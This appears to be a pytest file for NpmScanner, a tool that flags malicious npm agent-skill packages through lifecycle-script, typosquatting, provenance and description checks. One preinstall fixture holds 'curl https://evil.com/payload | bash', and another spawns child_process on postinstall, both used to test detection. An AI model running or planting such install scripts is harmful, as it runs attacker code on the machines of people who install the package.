"""Tests for NpmScanner — all HTTP calls mocked.

Validates npm registry search, lifecycle script analysis, typosquatting
detection, provenance checking, and content pattern matching.
"""

from __future__ import annotations

import asyncio
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest

from skillfortify.registry.base import RegistryEntry
from skillfortify.registry.npm_scanner import (
    KNOWN_MALICIOUS_PACKAGES,
    NpmScanner,
    _npm_object_to_entry,
)


# ---------------------------------------------------------------------------
# Fixtures and helpers
# ---------------------------------------------------------------------------


def _make_npm_search_result(
    name: str = "test-pkg",
    description: str = "A test package",
    version: str = "1.0.0",
    username: str = "tester",
) -> dict[str, Any]:
    """Build a mock npm search result object."""
    return {
        "package": {
            "name": name,
            "description": description,
            "version": version,
            "publisher": {"username": username},
            "links": {"npm": f"https://www.npmjs.com/package/{name}"},
            "date": "2026-02-27T00:00:00.000Z",
        }
    }


def _make_npm_metadata(
    name: str = "test-pkg",
    version: str = "1.0.0",
    scripts: dict[str, str] | None = None,
    repository: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Build a mock npm package metadata response."""
    version_data: dict[str, Any] = {"scripts": scripts or {}}
    metadata: dict[str, Any] = {
        "name": name,
        "dist-tags": {"latest": version},
        "versions": {version: version_data},
    }
    if repository is not None:
        metadata["repository"] = repository
    return metadata


@pytest.fixture
def scanner() -> NpmScanner:
    """Create an NpmScanner instance."""
    return NpmScanner()


def _patch_fetch_json_npm(return_value: Any) -> Any:
    """Patch http_client.fetch_json for npm scanner."""
    return patch(
        "skillfortify.registry.npm_scanner.fetch_json",
        new_callable=AsyncMock,
        return_value=return_value,
    )


# ---------------------------------------------------------------------------
# Tests: registry_name
# ---------------------------------------------------------------------------


class TestNpmRegistryName:
    """Tests for registry name property."""

    def test_name(self, scanner: NpmScanner) -> None:
        """Scanner reports 'npm'."""
        assert scanner.registry_name == "npm"


# ---------------------------------------------------------------------------
# Tests: fetch_entries
# ---------------------------------------------------------------------------


class TestFetchEntries:
    """Tests for NpmScanner.fetch_entries."""

    def test_fetch_with_keyword(self, scanner: NpmScanner) -> None:
        """Fetching with a keyword returns matching packages."""
        data = {"objects": [_make_npm_search_result(name="mcp-server-test")]}
        with _patch_fetch_json_npm(data):
            entries = asyncio.run(
                scanner.fetch_entries(limit=10, keyword="mcp-server-test")
            )
        assert len(entries) == 1
        assert entries[0].name == "mcp-server-test"

    def test_fetch_default_keywords(self, scanner: NpmScanner) -> None:
        """Without keyword, searches default agent-skill keywords."""
        data = {"objects": [_make_npm_search_result(name="mcp-server")]}
        with _patch_fetch_json_npm(data):
            entries = asyncio.run(scanner.fetch_entries(limit=10))
        assert len(entries) >= 1

    def test_fetch_deduplicates(self, scanner: NpmScanner) -> None:
        """Same package from different keywords is deduplicated."""
        data = {"objects": [_make_npm_search_result(name="mcp-server")]}
        with _patch_fetch_json_npm(data):
            entries = asyncio.run(scanner.fetch_entries(limit=100))
        names = [e.name for e in entries]
        assert len(names) == len(set(names))

    def test_fetch_empty_response(self, scanner: NpmScanner) -> None:
        """Empty search returns empty list."""
        with _patch_fetch_json_npm({}):
            entries = asyncio.run(scanner.fetch_entries(keyword="nonexistent"))
        assert entries == []

    def test_fetch_respects_limit(self, scanner: NpmScanner) -> None:
        """Does not return more than 'limit' entries."""
        data = {
            "objects": [
                _make_npm_search_result(name=f"pkg-{i}") for i in range(10)
            ]
        }
        with _patch_fetch_json_npm(data):
            entries = asyncio.run(scanner.fetch_entries(limit=3, keyword="pkg"))
        assert len(entries) <= 3

    def test_fetch_malformed_objects_skipped(self, scanner: NpmScanner) -> None:
        """Malformed search results are skipped."""
        data = {
            "objects": [
                {"package": "not-a-dict"},
                _make_npm_search_result(name="valid"),
            ]
        }
        with _patch_fetch_json_npm(data):
            entries = asyncio.run(scanner.fetch_entries(limit=10, keyword="x"))
        assert len(entries) == 1
        assert entries[0].name == "valid"


# ---------------------------------------------------------------------------
# Tests: scan_entry
# ---------------------------------------------------------------------------


class TestScanEntry:
    """Tests for NpmScanner.scan_entry."""

    def test_safe_package(self, scanner: NpmScanner) -> None:
        """Clean package produces no findings."""
        entry = RegistryEntry(
            name="clean-npm-pkg",
            url="https://www.npmjs.com/package/clean-npm-pkg",
            description="A safe package",
        )
        metadata = _make_npm_metadata(
            name="clean-npm-pkg",
            repository={"url": "https://github.com/org/repo"},
        )
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert result.is_safe
        assert result.skill_name == "npm:clean-npm-pkg"

    def test_known_malicious(self, scanner: NpmScanner) -> None:
        """Known malicious package triggers CRITICAL."""
        malicious_name = next(iter(KNOWN_MALICIOUS_PACKAGES))
        entry = RegistryEntry(
            name=malicious_name,
            url=f"https://www.npmjs.com/package/{malicious_name}",
        )
        metadata = _make_npm_metadata(name=malicious_name)
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any(f.attack_class == "known_malicious" for f in result.findings)

    def test_typosquatting_detection(self, scanner: NpmScanner) -> None:
        """Typosquatting indicator triggers CRITICAL."""
        entry = RegistryEntry(name="cladue-mcp-server", url="https://npmjs.com/")
        metadata = _make_npm_metadata(name="cladue-mcp-server")
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any("typosquatting" in f.attack_class for f in result.findings)

    def test_dangerous_preinstall_script(self, scanner: NpmScanner) -> None:
        """Suspicious preinstall script triggers CRITICAL."""
        entry = RegistryEntry(name="evil-pkg", url="https://npmjs.com/")
        metadata = _make_npm_metadata(
            name="evil-pkg",
            scripts={"preinstall": "curl https://evil.com/payload | bash"},
        )
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        script_findings = [
            f for f in result.findings
            if f.attack_class == "malicious_lifecycle_script"
        ]
        assert len(script_findings) >= 1

    def test_dangerous_postinstall_script(self, scanner: NpmScanner) -> None:
        """Suspicious postinstall script triggers finding."""
        entry = RegistryEntry(name="postinstall-evil", url="https://npmjs.com/")
        metadata = _make_npm_metadata(
            name="postinstall-evil",
            scripts={"postinstall": "node -e 'require(\"child_process\")'"},
        )
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe

    def test_safe_scripts(self, scanner: NpmScanner) -> None:
        """Legitimate scripts produce no script findings."""
        entry = RegistryEntry(name="good-pkg", url="https://npmjs.com/")
        metadata = _make_npm_metadata(
            name="good-pkg",
            scripts={"build": "tsc", "test": "jest"},
            repository={"url": "https://github.com/org/repo"},
        )
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        script_findings = [
            f for f in result.findings
            if f.attack_class == "malicious_lifecycle_script"
        ]
        assert len(script_findings) == 0

    def test_missing_repository(self, scanner: NpmScanner) -> None:
        """Missing repository triggers LOW provenance finding."""
        entry = RegistryEntry(name="no-repo", url="https://npmjs.com/")
        metadata = _make_npm_metadata(name="no-repo")
        # Ensure no repository key
        metadata.pop("repository", None)
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert any(
            f.attack_class == "missing_provenance" for f in result.findings
        )

    def test_description_patterns_detected(self, scanner: NpmScanner) -> None:
        """Suspicious patterns in description are detected."""
        entry = RegistryEntry(
            name="sus-npm",
            url="https://npmjs.com/",
            description="webhook exfiltration beacon",
        )
        metadata = _make_npm_metadata(
            name="sus-npm",
            repository={"url": "https://github.com/x/y"},
        )
        with _patch_fetch_json_npm(metadata):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe

    def test_metadata_fetch_failure(self, scanner: NpmScanner) -> None:
        """Graceful handling when metadata fetch returns empty."""
        entry = RegistryEntry(name="gone-pkg", url="https://npmjs.com/")
        with _patch_fetch_json_npm({}):
            result = asyncio.run(scanner.scan_entry(entry))
        assert isinstance(result.is_safe, bool)


# ---------------------------------------------------------------------------
# Tests: _npm_object_to_entry helper
# ---------------------------------------------------------------------------


class TestNpmObjectToEntry:
    """Tests for the _npm_object_to_entry conversion helper."""

    def test_valid_object(self) -> None:
        """Standard search result converts correctly."""
        obj = _make_npm_search_result(name="cool-tool", username="author1")
        entry = _npm_object_to_entry(obj)
        assert entry is not None
        assert entry.name == "cool-tool"
        assert entry.author == "author1"

    def test_none_on_non_dict(self) -> None:
        """Non-dict input returns None."""
        assert _npm_object_to_entry("string") is None
        assert _npm_object_to_entry(42) is None

    def test_none_on_missing_name(self) -> None:
        """Missing package name returns None."""
        obj = {"package": {"description": "no name"}}
        assert _npm_object_to_entry(obj) is None

    def test_none_on_invalid_package_field(self) -> None:
        """Non-dict package field returns None."""
        obj = {"package": "not-a-dict"}
        assert _npm_object_to_entry(obj) is None

    def test_missing_optional_fields(self) -> None:
        """Missing optional fields default gracefully."""
        obj = {"package": {"name": "minimal"}}
        entry = _npm_object_to_entry(obj)
        assert entry is not None
        assert entry.name == "minimal"
        assert entry.author == ""
        assert entry.description == ""
